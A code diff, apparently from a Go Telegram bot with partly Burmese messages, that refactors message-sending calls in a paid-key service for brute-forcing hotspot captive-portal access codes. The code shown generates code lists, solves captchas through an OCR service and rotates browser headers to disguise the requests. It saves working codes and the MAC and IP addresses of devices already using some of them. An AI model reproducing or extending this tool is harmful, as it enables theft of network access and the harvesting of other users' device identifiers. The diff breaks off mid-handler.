@@ -33,7 +33,7 @@ var (
 	OCR_SERVER   = "http://127.0.0.1:5000"
 )
 
-// ==================== HEADER POOLS (13,440+ combinations) ====================
+// ==================== HEADER POOLS ====================
 var userAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0",
@@ -79,12 +79,12 @@ var secCHUAs = []string{
 var secCHUAPlatforms = []string{`"Windows"`, `"macOS"`, `"Linux"`, `"Android"`}
 var secCHUAMobiles = []string{"?0", "?1"}
 
-func randomUA() string            { return userAgents[rand.Intn(len(userAgents))] }
-func randomAcceptLang() string    { return acceptLanguages[rand.Intn(len(acceptLanguages))] }
-func randomAccept() string        { return acceptHeaders[rand.Intn(len(acceptHeaders))] }
-func randomSecCHUA() string       { return secCHUAs[rand.Intn(len(secCHUAs))] }
+func randomUA() string              { return userAgents[rand.Intn(len(userAgents))] }
+func randomAcceptLang() string      { return acceptLanguages[rand.Intn(len(acceptLanguages))] }
+func randomAccept() string          { return acceptHeaders[rand.Intn(len(acceptHeaders))] }
+func randomSecCHUA() string         { return secCHUAs[rand.Intn(len(secCHUAs))] }
 func randomSecCHUAPlatform() string { return secCHUAPlatforms[rand.Intn(len(secCHUAPlatforms))] }
-func randomSecCHUAMobile() string { return secCHUAMobiles[rand.Intn(len(secCHUAMobiles))] }
+func randomSecCHUAMobile() string   { return secCHUAMobiles[rand.Intn(len(secCHUAMobiles))] }
 
 func applyRandomHeaders(req *http.Request, referer string) {
 	req.Header.Set("User-Agent", randomUA())
@@ -128,8 +128,13 @@ var (
 	semaphore       chan struct{}
 	httpClient      = &http.Client{Timeout: 15 * time.Second}
 
-	successQueue = make(chan struct{ ChatID int64; Code string }, 10000)
-	staQueue     = make(chan struct{ Code, MAC, IP, Timestamp string }, 10000)
+	successQueue = make(chan struct {
+		ChatID int64
+		Code   string
+	}, 10000)
+	staQueue = make(chan struct {
+		Code, MAC, IP, Timestamp string
+	}, 10000)
 )
 
 // ==================== UTILITY FUNCTIONS ====================
@@ -318,7 +323,7 @@ func updateFileContent(path string, content map[string]interface{}, sha, message
 	return nil
 }
 
-// ==================== CAPTCHA SOLVER (Python Microservice) ====================
+// ==================== CAPTCHA SOLVER ====================
 func solveCaptcha(imgBytes []byte) (string, error) {
 	req, _ := http.NewRequest("POST", OCR_SERVER+"/ocr", bytes.NewReader(imgBytes))
 	req.Header.Set("Content-Type", "application/octet-stream")
@@ -523,14 +528,29 @@ func runBruteForce(mode string, chatID int64, sessionURL string, target, length 
 			l = 7
 		}
 		prepMsg := fmt.Sprintf("🔄 Preparing Scan for Mode %s...\n\n📦 Generating:  [████████░░░░░░░░░░░░] 40%%", mode)
-		if em, err := botr.EditMessageText(chatID, progressMsg.MessageID, prepMsg); err == nil {
+		params := &telego.EditMessageTextParams{
+			ChatID:    telego.ChatID{ID: chatID},
+			MessageID: progressMsg.MessageID,
+			Text:      prepMsg,
+		}
+		if em, err := botr.EditMessageText(params); err == nil {
 			progressMsg = *em
 		}
 		codes = generateExhaustive(l)
 		prepMsg2 := fmt.Sprintf("🔄 Preparing Scan for Mode %s...\n\n📦 Generating:  [████████████████░░░░] 80%%\n🔍 Filtering:   [████████████████████] 100%%\n🔀 Shuffling:   [████████████████████] 100%%\n\n✅ Preparation Complete! (%d codes ready)", mode, len(codes))
-		botr.EditMessageText(chatID, progressMsg.MessageID, prepMsg2)
+		params2 := &telego.EditMessageTextParams{
+			ChatID:    telego.ChatID{ID: chatID},
+			MessageID: progressMsg.MessageID,
+			Text:      prepMsg2,
+		}
+		botr.EditMessageText(params2)
 	} else {
-		botr.EditMessageText(chatID, progressMsg.MessageID, "✅ Ready! Starting scan...")
+		params := &telego.EditMessageTextParams{
+			ChatID:    telego.ChatID{ID: chatID},
+			MessageID: progressMsg.MessageID,
+			Text:      "✅ Ready! Starting scan...",
+		}
+		botr.EditMessageText(params)
 	}
 
 	total := len(codes)
@@ -589,7 +609,10 @@ func runBruteForce(mode string, chatID int64, sessionURL string, target, length 
 		if time.Since(lastKeyCheck) >= 10*time.Minute {
 			data, _, _ := getFileContent("auth_list.json")
 			if kd, ok := data[fmt.Sprintf("%d", chatID)]; !ok || !checkKeyExpiration(kd) {
-				botr.SendMessage(chatID, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။",
+				})
 				mu.Lock()
 				delete(scanTasks, chatID)
 				mu.Unlock()
@@ -636,7 +659,10 @@ func runBruteForce(mode string, chatID int64, sessionURL string, target, length 
 					}
 					if !dup {
 						successTexts[chatID] = append(successTexts[chatID], entry)
-						successQueue <- struct{ ChatID int64; Code string }{chatID, c}
+						successQueue <- struct {
+							ChatID int64
+							Code   string
+						}{chatID, c}
 						if notifySetting[chatID] {
 							var sb strings.Builder
 							sb.WriteString("✅ Success Codes:\n\n")
@@ -650,9 +676,18 @@ func runBruteForce(mode string, chatID int64, sessionURL string, target, length 
 							}
 							text := sb.String()
 							if msg, ok := successMessages[chatID]; ok {
-								botr.EditMessageText(chatID, msg.MessageID, text, telego.WithParseMode("HTML"))
+								botr.EditMessageText(&telego.EditMessageTextParams{
+									ChatID:    telego.ChatID{ID: chatID},
+									MessageID: msg.MessageID,
+									Text:      text,
+									ParseMode: "HTML",
+								})
 							} else {
-								sent, _ := botr.SendMessage(chatID, text, telego.WithParseMode("HTML"))
+								sent, _ := botr.SendMessage(&telego.SendMessageParams{
+									ChatID:    telego.ChatID{ID: chatID},
+									Text:      text,
+									ParseMode: "HTML",
+								})
 								if sent != nil {
 									successMessages[chatID] = *sent
 								}
@@ -661,7 +696,11 @@ func runBruteForce(mode string, chatID int64, sessionURL string, target, length 
 					}
 					found++
 					if target > 0 && found >= target {
-						botr.EditMessageText(chatID, progressMsg.MessageID, "🎯 Target reached!")
+						botr.EditMessageText(&telego.EditMessageTextParams{
+							ChatID:    telego.ChatID{ID: chatID},
+							MessageID: progressMsg.MessageID,
+							Text:      "🎯 Target reached!",
+						})
 						mu.Lock()
 						delete(scanTasks, chatID)
 						mu.Unlock()
@@ -683,15 +722,26 @@ func runBruteForce(mode string, chatID int64, sessionURL string, target, length 
 							ip = i
 						}
 					}
-					staQueue <- struct{ Code, MAC, IP, Timestamp string }{c, mac, ip, time.Now().UTC().Format(time.RFC3339)}
+					staQueue <- struct {
+						Code, MAC, IP, Timestamp string
+					}{c, mac, ip, time.Now().UTC().Format(time.RFC3339)}
 					limitedTexts[chatID] = append(limitedTexts[chatID], fmt.Sprintf("%s (MAC: %s, IP: %s)", c, mac, ip))
 					if notifySetting[chatID] {
 						ll := strings.Join(limitedTexts[chatID], "\n")
 						text := fmt.Sprintf("⚠️ Limited Codes:\n<code>%s</code>", ll)
 						if msg, ok := limitedMessages[chatID]; ok {
-							botr.EditMessageText(chatID, msg.MessageID, text, telego.WithParseMode("HTML"))
+							botr.EditMessageText(&telego.EditMessageTextParams{
+								ChatID:    telego.ChatID{ID: chatID},
+								MessageID: msg.MessageID,
+								Text:      text,
+								ParseMode: "HTML",
+							})
 						} else {
-							sent, _ := botr.SendMessage(chatID, text, telego.WithParseMode("HTML"))
+							sent, _ := botr.SendMessage(&telego.SendMessageParams{
+								ChatID:    telego.ChatID{ID: chatID},
+								Text:      text,
+								ParseMode: "HTML",
+							})
 							if sent != nil {
 								limitedMessages[chatID] = *sent
 							}
@@ -699,7 +749,11 @@ func runBruteForce(mode string, chatID int64, sessionURL string, target, length 
 					}
 					found++
 					if target > 0 && found >= target {
-						botr.EditMessageText(chatID, progressMsg.MessageID, "🎯 Target reached!")
+						botr.EditMessageText(&telego.EditMessageTextParams{
+							ChatID:    telego.ChatID{ID: chatID},
+							MessageID: progressMsg.MessageID,
+							Text:      "🎯 Target reached!",
+						})
 						mu.Lock()
 						delete(scanTasks, chatID)
 						mu.Unlock()
@@ -716,21 +770,32 @@ func runBruteForce(mode string, chatID int64, sessionURL string, target, length 
 		if elapsed == 0 {
 			speed = 0
 		}
-		botr.EditMessageText(chatID, progressMsg.MessageID, formatProgress(checked, total, speed, found, target))
+		botr.EditMessageText(&telego.EditMessageTextParams{
+			ChatID:    telego.ChatID{ID: chatID},
+			MessageID: progressMsg.MessageID,
+			Text:      formatProgress(checked, total, speed, found, target),
+		})
 	}
 
-	botr.EditMessageText(chatID, progressMsg.MessageID, "✅ Scan completed.")
+	botr.EditMessageText(&telego.EditMessageTextParams{
+		ChatID:    telego.ChatID{ID: chatID},
+		MessageID: progressMsg.MessageID,
+		Text:      "✅ Scan completed.",
+	})
 	mu.Lock()
 	delete(scanTasks, chatID)
 	delete(captchaCache, chatID)
 	mu.Unlock()
 }
 
-// ==================== GITHUB UPDATERS (BACKGROUND) ====================
+// ==================== GITHUB UPDATERS ====================
 func successUpdater() {
 	for {
 		time.Sleep(80 * time.Second)
-		items := make([]struct{ ChatID int64; Code string }, 0)
+		var items []struct {
+			ChatID int64
+			Code   string
+		}
 		for {
 			select {
 			case item := <-successQueue:
@@ -748,7 +813,6 @@ func successUpdater() {
 			cid := fmt.Sprintf("%d", item.ChatID)
 			if data[cid] == nil {
 				data[cid] = make([]interface{}, 0)
-				data[cid] = []interface{}{}
 			}
 			codes := data[cid].([]interface{})
 			found := false
@@ -769,7 +833,9 @@ func successUpdater() {
 func staUpdater() {
 	for {
 		time.Sleep(80 * time.Second)
-		items := make([]struct{ Code, MAC, IP, Timestamp string }, 0)
+		var items []struct {
+			Code, MAC, IP, Timestamp string
+		}
 		for {
 			select {
 			case item := <-staQueue:
@@ -803,60 +869,91 @@ func registerHandlers(b *telego.Bot) {
 		if len(args) == 0 {
 			return
 		}
+		chatID := msg.Chat.ChatID()
 		switch args[0] {
 		case "/start":
-			botr.SendMessage(msg.Chat.ChatID(), "Bot စတင်ပါပြီ။ /help ဖြင့် လမ်းညွှန်ကြည့်ပါ။")
+			botr.SendMessage(&telego.SendMessageParams{
+				ChatID: telego.ChatID{ID: chatID},
+				Text:   "Bot စတင်ပါပြီ။ /help ဖြင့် လမ်းညွှန်ကြည့်ပါ။",
+			})
 		case "/help":
-			botr.SendMessage(msg.Chat.ChatID(), `📚 Command လမ်းညွှန်
+			botr.SendMessage(&telego.SendMessageParams{
+				ChatID: telego.ChatID{ID: chatID},
+				Text: `📚 Command လမ်းညွှန်
 /key - Key အတည်ပြုရန်
 /setup [url] - Session URL
 /brute <mode> [target] - Scan (6,7,8,9,ascii-lower,all)
 /stop /resume /saved /notify /recheck /result
-Admin: /genkey /delkey /listkeys /status /stalist /delsta`, telego.WithParseMode("Markdown"))
+Admin: /genkey /delkey /listkeys /status /stalist /delsta`,
+			})
 		case "/key":
-			uid := fmt.Sprintf("%d", msg.Chat.ChatID())
+			uid := fmt.Sprintf("%d", chatID)
 			data, _, _ := getFileContent("auth_list.json")
 			if kd, ok := data[uid]; ok {
 				if checkKeyExpiration(kd) {
 					mu.Lock()
-					approve[msg.Chat.ChatID()] = true
-					userData[msg.Chat.ChatID()] = &UserData{}
+					approve[chatID] = true
+					userData[chatID] = &UserData{}
 					mu.Unlock()
-					botr.SendMessage(msg.Chat.ChatID(), "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် Session URL ထည့်ပါ။")
+					botr.SendMessage(&telego.SendMessageParams{
+						ChatID: telego.ChatID{ID: chatID},
+						Text:   "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် Session URL ထည့်ပါ။",
+					})
 				} else {
-					botr.SendMessage(msg.Chat.ChatID(), "❌ Key Expired ဖြစ်နေပါသည်။")
+					botr.SendMessage(&telego.SendMessageParams{
+						ChatID: telego.ChatID{ID: chatID},
+						Text:   "❌ Key Expired ဖြစ်နေပါသည်။",
+					})
 				}
 			} else {
-				botr.SendMessage(msg.Chat.ChatID(), "သင်၏ key ကို register မလုပ်ရသေးပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "သင်၏ key ကို register မလုပ်ရသေးပါ။",
+				})
 			}
 		case "/setup":
 			args := strings.SplitN(msg.Text, " ", 2)
 			if len(args) < 2 {
-				botr.SendMessage(msg.Chat.ChatID(), "/setup your_session_url")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "/setup your_session_url",
+				})
 				return
 			}
 			mu.RLock()
-			app := approve[msg.Chat.ChatID()]
+			app := approve[chatID]
 			mu.RUnlock()
 			if !app {
-				botr.SendMessage(msg.Chat.ChatID(), "/key ဖြင့် အတည်ပြုပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "/key ဖြင့် အတည်ပြုပါ။",
+				})
 				return
 			}
 			if strings.Contains(args[1], "gw_id") && strings.Contains(args[1], "mac") {
 				mu.Lock()
-				if userData[msg.Chat.ChatID()] == nil {
-					userData[msg.Chat.ChatID()] = &UserData{}
+				if userData[chatID] == nil {
+					userData[chatID] = &UserData{}
 				}
-				userData[msg.Chat.ChatID()].SessionURL = args[1]
+				userData[chatID].SessionURL = args[1]
 				mu.Unlock()
-				botr.SendMessage(msg.Chat.ChatID(), "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။",
+				})
 			} else {
-				botr.SendMessage(msg.Chat.ChatID(), "Session URL မှားယွင်းနေပါသည်။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "Session URL မှားယွင်းနေပါသည်။",
+				})
 			}
 		case "/brute":
 			args := strings.Fields(msg.Text)
 			if len(args) < 2 {
-				botr.SendMessage(msg.Chat.ChatID(), "/brute <mode> [target/length]")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "/brute <mode> [target/length]",
+				})
 				return
 			}
 			mode := args[1]
@@ -871,20 +968,29 @@ Admin: /genkey /delkey /listkeys /status /stalist /delsta`, telego.WithParseMode
 					fmt.Sscanf(args[2], "%d", &target)
 				}
 			}
-			cid := msg.Chat.ChatID()
+			cid := chatID
 			mu.RLock()
 			app := approve[cid]
 			_, hasSess := userData[cid]
 			mu.RUnlock()
 			if !app {
-				botr.SendMessage(cid, "/key အတည်ပြုပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: cid},
+					Text:   "/key အတည်ပြုပါ။",
+				})
 				return
 			}
 			if !hasSess || userData[cid].SessionURL == "" {
-				botr.SendMessage(cid, "/setup လုပ်ပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: cid},
+					Text:   "/setup လုပ်ပါ။",
+				})
 				return
 			}
-			pm, _ := botr.SendMessage(cid, "Preparing...")
+			pm, _ := botr.SendMessage(&telego.SendMessageParams{
+				ChatID: telego.ChatID{ID: cid},
+				Text:   "Preparing...",
+			})
 			mu.Lock()
 			scanTasks[cid] = &ScanTask{Stop: false, ScanID: fmt.Sprintf("%d", time.Now().UnixNano())}
 			delete(successMessages, cid)
@@ -892,40 +998,58 @@ Admin: /genkey /delkey /listkeys /status /stalist /delsta`, telego.WithParseMode
 			mu.Unlock()
 			go runBruteForce(mode, cid, userData[cid].SessionURL, target, length, *pm)
 		case "/stop":
-			cid := msg.Chat.ChatID()
+			cid := chatID
 			mu.Lock()
 			if t, ok := scanTasks[cid]; ok {
 				t.Stop = true
 				delete(scanTasks, cid)
 				delete(captchaCache, cid)
 				mu.Unlock()
-				botr.SendMessage(cid, "Scan ရပ်ထားပါသည်။ /resume ဖြင့် ပြန်စနိုင်ပါသည်။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: cid},
+					Text:   "Scan ရပ်ထားပါသည်။ /resume ဖြင့် ပြန်စနိုင်ပါသည်။",
+				})
 			} else {
 				mu.Unlock()
-				botr.SendMessage(cid, "ရပ်ရန် scan မရှိပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: cid},
+					Text:   "ရပ်ရန် scan မရှိပါ။",
+				})
 			}
 		case "/resume":
-			cid := msg.Chat.ChatID()
+			cid := chatID
 			if _, hasSess := userData[cid]; !hasSess || userData[cid].SessionURL == "" {
-				botr.SendMessage(cid, "/setup လုပ်ပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: cid},
+					Text:   "/setup လုပ်ပါ။",
+				})
 				return
 			}
-			pm, _ := botr.SendMessage(cid, "Preparing...")
+			pm, _ := botr.SendMessage(&telego.SendMessageParams{
+				ChatID: telego.ChatID{ID: cid},
+				Text:   "Preparing...",
+			})
 			mu.Lock()
 			scanTasks[cid] = &ScanTask{Stop: false, ScanID: fmt.Sprintf("%d", time.Now().UnixNano())}
 			delete(successMessages, cid)
 			delete(limitedMessages, cid)
 			mu.Unlock()
 			go runBruteForce("6", cid, userData[cid].SessionURL, 0, 0, *pm)
-			botr.SendMessage(cid, "ယခင် scan ပြန်စပါပြီ။")
+			botr.SendMessage(&telego.SendMessageParams{
+				ChatID: telego.ChatID{ID: cid},
+				Text:   "ယခင် scan ပြန်စပါပြီ။",
+			})
 		case "/saved":
-			cid := msg.Chat.ChatID()
+			cid := chatID
 			mu.RLock()
 			s := successTexts[cid]
 			l := limitedTexts[cid]
 			mu.RUnlock()
 			if len(s) == 0 && len(l) == 0 {
-				botr.SendMessage(cid, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: cid},
+					Text:   "ရှာတွေ့ထားသော code မရှိသေးပါ။",
+				})
 				return
 			}
 			var sb strings.Builder
@@ -943,9 +1067,13 @@ Admin: /genkey /delkey /listkeys /status /stalist /delsta`, telego.WithParseMode
 			if len(l) > 0 {
 				sb.WriteString(fmt.Sprintf("\n⚠️ Limited Codes (%d):\n<code>%s</code>", len(l), strings.Join(l, "\n")))
 			}
-			botr.SendMessage(cid, sb.String(), telego.WithParseMode("HTML"))
+			botr.SendMessage(&telego.SendMessageParams{
+				ChatID:    telego.ChatID{ID: cid},
+				Text:      sb.String(),
+				ParseMode: "HTML",
+			})
 		case "/notify":
-			cid := msg.Chat.ChatID()
+			cid := chatID
 			mu.Lock()
 			notifySetting[cid] = !notifySetting[cid]
 			st := "OFF"
@@ -953,27 +1081,42 @@ Admin: /genkey /delkey /listkeys /status /stalist /delsta`, telego.WithParseMode
 				st = "ON"
 			}
 			mu.Unlock()
-			botr.SendMessage(cid, "Notify: "+st)
+			botr.SendMessage(&telego.SendMessageParams{
+				ChatID: telego.ChatID{ID: cid},
+				Text:   "Notify: " + st,
+			})
 		case "/recheck":
-			cid := msg.Chat.ChatID()
+			cid := chatID
 			mu.RLock()
 			app := approve[cid]
 			ud, hasU := userData[cid]
 			succ := successTexts[cid]
 			mu.RUnlock()
 			if !app {
-				botr.SendMessage(cid, "/key အတည်ပြုပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: cid},
+					Text:   "/key အတည်ပြုပါ။",
+				})
 				return
 			}
 			if !hasU || ud.SessionURL == "" {
-				botr.SendMessage(cid, "/setup လုပ်ပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: cid},
+					Text:   "/setup လုပ်ပါ။",
+				})
 				return
 			}
 			if len(succ) == 0 {
-				botr.SendMessage(cid, "Recheck လုပ်ရန် code မရှိပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: cid},
+					Text:   "Recheck လုပ်ရန် code မရှိပါ။",
+				})
 				return
 			}
-			botr.SendMessage(cid, "Recheck လုပ်နေပါသည်...")
+			botr.SendMessage(&telego.SendMessageParams{
+				ChatID: telego.ChatID{ID: cid},
+				Text:   "Recheck လုပ်နေပါသည်...",
+			})
 			var ns []string
 			for _, e := range succ {
 				code := strings.SplitN(e, " | ", 2)[0]
@@ -986,25 +1129,42 @@ Admin: /genkey /delkey /listkeys /status /stalist /delsta`, telego.WithParseMode
 			successTexts[cid] = ns
 			mu.Unlock()
 			if len(ns) > 0 {
-				botr.SendMessage(cid, fmt.Sprintf("✅ Rechecked:\n<code>%s</code>", strings.Join(ns, "\n")), telego.WithParseMode("HTML"))
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID:    telego.ChatID{ID: cid},
+					Text:      fmt.Sprintf("✅ Rechecked:\n<code>%s</code>", strings.Join(ns, "\n")),
+					ParseMode: "HTML",
+				})
 			} else {
-				botr.SendMessage(cid, "Success code တစ်ခုမှ မကျန်ပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: cid},
+					Text:   "Success code တစ်ခုမှ မကျန်ပါ။",
+				})
 			}
 		case "/result":
-			uid := fmt.Sprintf("%d", msg.Chat.ChatID())
+			uid := fmt.Sprintf("%d", chatID)
 			data, _, _ := getFileContent("result.json")
 			if codes, ok := data[uid].([]interface{}); ok && len(codes) > 0 {
 				var cl []string
 				for _, c := range codes {
 					cl = append(cl, fmt.Sprintf("%v", c))
 				}
-				botr.SendMessage(msg.Chat.ChatID(), fmt.Sprintf("✅ GitHub:\n<code>%s</code>", strings.Join(cl, "\n")), telego.WithParseMode("HTML"))
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID:    telego.ChatID{ID: chatID},
+					Text:      fmt.Sprintf("✅ GitHub:\n<code>%s</code>", strings.Join(cl, "\n")),
+					ParseMode: "HTML",
+				})
 			} else {
-				botr.SendMessage(msg.Chat.ChatID(), "သင့်တွင် code မရှိသေးပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "သင့်တွင် code မရှိသေးပါ။",
+				})
 			}
 		case "/status":
-			if fmt.Sprintf("%d", msg.Chat.ChatID()) != ADMIN_ID {
-				botr.SendMessage(msg.Chat.ChatID(), "No Permission")
+			if fmt.Sprintf("%d", chatID) != ADMIN_ID {
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "No Permission",
+				})
 				return
 			}
 			mu.RLock()
@@ -1022,40 +1182,64 @@ Admin: /genkey /delkey /listkeys /status /stalist /delsta`, telego.WithParseMode
 			}
 			mu.RUnlock()
 			uptime := time.Since(startTime)
-			botr.SendMessage(msg.Chat.ChatID(), fmt.Sprintf("📊 Status\n⏱ %dh%dm%ds\n🔍 Active: %d\n✅ Users: %d",
-				int(uptime.Hours()), int(uptime.Minutes())%60, int(uptime.Seconds())%60, act, apv))
+			botr.SendMessage(&telego.SendMessageParams{
+				ChatID: telego.ChatID{ID: chatID},
+				Text: fmt.Sprintf("📊 Status\n⏱ %dh%dm%ds\n🔍 Active: %d\n✅ Users: %d",
+					int(uptime.Hours()), int(uptime.Minutes())%60, int(uptime.Seconds())%60, act, apv),
+			})
 		case "/genkey":
-			if fmt.Sprintf("%d", msg.Chat.ChatID()) != ADMIN_ID {
-				botr.SendMessage(msg.Chat.ChatID(), "No Permission")
+			if fmt.Sprintf("%d", chatID) != ADMIN_ID {
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "No Permission",
+				})
 				return
 			}
 			args := strings.Fields(msg.Text)
 			if len(args) < 3 {
-				botr.SendMessage(msg.Chat.ChatID(), "/genkey <duration> <user_id>")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "/genkey <duration> <user_id>",
+				})
 				return
 			}
 			exp := generateExpiry(args[1])
 			if exp == "" {
-				botr.SendMessage(msg.Chat.ChatID(), "Duration မမှန်ပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "Duration မမှန်ပါ။",
+				})
 				return
 			}
 			data, sha, _ := getFileContent("auth_list.json")
 			data[args[2]] = map[string]interface{}{"expires_at": exp, "plan": args[1]}
 			updateFileContent("auth_list.json", data, sha, "Add key")
-			botr.SendMessage(msg.Chat.ChatID(), fmt.Sprintf("✅ Key Generated\nUSER: %s\nPLAN: %s", args[2], args[1]))
+			botr.SendMessage(&telego.SendMessageParams{
+				ChatID: telego.ChatID{ID: chatID},
+				Text:   fmt.Sprintf("✅ Key Generated\nUSER: %s\nPLAN: %s", args[2], args[1]),
+			})
 		case "/delkey":
-			if fmt.Sprintf("%d", msg.Chat.ChatID()) != ADMIN_ID {
-				botr.SendMessage(msg.Chat.ChatID(), "No Permission")
+			if fmt.Sprintf("%d", chatID) != ADMIN_ID {
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "No Permission",
+				})
 				return
 			}
 			args := strings.Fields(msg.Text)
 			if len(args) < 2 {
-				botr.SendMessage(msg.Chat.ChatID(), "/delkey <user_id>")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "/delkey <user_id>",
+				})
 				return
 			}
 			data, sha, _ := getFileContent("auth_list.json")
 			if _, ok := data[args[1]]; !ok {
-				botr.SendMessage(msg.Chat.ChatID(), "User မတွေ့ပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "User မတွေ့ပါ။",
+				})
 				return
 			}
 			delete(data, args[1])
@@ -1066,15 +1250,24 @@ Admin: /genkey /delkey /listkeys /status /stalist /delsta`, telego.WithParseMode
 			delete(approve, cid)
 			delete(userData, cid)
 			mu.Unlock()
-			botr.SendMessage(msg.Chat.ChatID(), "✅ Key Deleted")
+			botr.SendMessage(&telego.SendMessageParams{
+				ChatID: telego.ChatID{ID: chatID},
+				Text:   "✅ Key Deleted",
+			})
 		case "/listkeys":
-			if fmt.Sprintf("%d", msg.Chat.ChatID()) != ADMIN_ID {
-				botr.SendMessage(msg.Chat.ChatID(), "No Permission")
+			if fmt.Sprintf("%d", chatID) != ADMIN_ID {
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "No Permission",
+				})
 				return
 			}
 			data, _, _ := getFileContent("auth_list.json")
 			if len(data) == 0 {
-				botr.SendMessage(msg.Chat.ChatID(), "Key မရှိသေးပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "Key မရှိသေးပါ။",
+				})
 				return
 			}
 			var ls []string
@@ -1082,24 +1275,39 @@ Admin: /genkey /delkey /listkeys /status /stalist /delsta`, telego.WithParseMode
 				m, _ := v.(map[string]interface{})
 				ls = append(ls, fmt.Sprintf("👤 %s | Plan: %s", u, m["plan"]))
 			}
-			botr.SendMessage(msg.Chat.ChatID(), strings.Join(ls, "\n"))
+			botr.SendMessage(&telego.SendMessageParams{
+				ChatID: telego.ChatID{ID: chatID},
+				Text:   strings.Join(ls, "\n"),
+			})
 		case "/stalist":
-			if fmt.Sprintf("%d", msg.Chat.ChatID()) != ADMIN_ID {
-				botr.SendMessage(msg.Chat.ChatID(), "No Permission")
+			if fmt.Sprintf("%d", chatID) != ADMIN_ID {
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "No Permission",
+				})
 				return
 			}
 			args := strings.Fields(msg.Text)
 			data, _, _ := getFileContent("sta_info.json")
 			if len(data) == 0 {
-				botr.SendMessage(msg.Chat.ChatID(), "STA info မရှိသေးပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "STA info မရှိသေးပါ။",
+				})
 				return
 			}
 			if len(args) >= 2 {
 				if info, ok := data[args[1]]; ok {
 					m := info.(map[string]interface{})
-					botr.SendMessage(msg.Chat.ChatID(), fmt.Sprintf("📋 %s\nMAC: %s\nIP: %s", args[1], m["mac"], m["ip"]))
+					botr.SendMessage(&telego.SendMessageParams{
+						ChatID: telego.ChatID{ID: chatID},
+						Text:   fmt.Sprintf("📋 %s\nMAC: %s\nIP: %s", args[1], m["mac"], m["ip"]),
+					})
 				} else {
-					botr.SendMessage(msg.Chat.ChatID(), "မတွေ့ပါ။")
+					botr.SendMessage(&telego.SendMessageParams{
+						ChatID: telego.ChatID{ID: chatID},
+						Text:   "မတွေ့ပါ။",
+					})
 				}
 			} else {
 				var ls []string
@@ -1107,33 +1315,47 @@ Admin: /genkey /delkey /listkeys /status /stalist /delsta`, telego.WithParseMode
 					m := v.(map[string]interface{})
 					ls = append(ls, fmt.Sprintf("%s (MAC: %s, IP: %s)", c, m["mac"], m["ip"]))
 				}
-				botr.SendMessage(msg.Chat.ChatID(), strings.Join(ls, "\n"))
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   strings.Join(ls, "\n"),
+				})
 			}
 		case "/delsta":
-			if fmt.Sprintf("%d", msg.Chat.ChatID()) != ADMIN_ID {
-				botr.SendMessage(msg.Chat.ChatID(), "No Permission")
+			if fmt.Sprintf("%d", chatID) != ADMIN_ID {
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "No Permission",
+				})
